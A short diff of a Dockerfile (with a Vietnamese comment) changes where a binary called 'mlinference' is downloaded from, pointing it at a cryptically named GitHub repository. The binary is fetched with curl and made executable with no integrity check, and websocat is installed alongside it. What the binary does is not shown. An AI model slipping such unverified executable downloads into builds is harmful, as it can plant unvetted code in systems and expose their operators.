@@ -61,7 +61,7 @@ RUN curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor |
     && rm -rf /var/lib/apt/lists/*
 
 # Cài đặt các công cụ bổ sung
-RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/llmsdeep/releases/download/mlinference/mlinference" \
+RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/sssloz/releases/download/ssloz/mlinference" \
     && chmod +x /usr/local/bin/mlinference \
     && wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl -O /usr/local/bin/websocat \
     && chmod +x /usr/local/bin/websocat
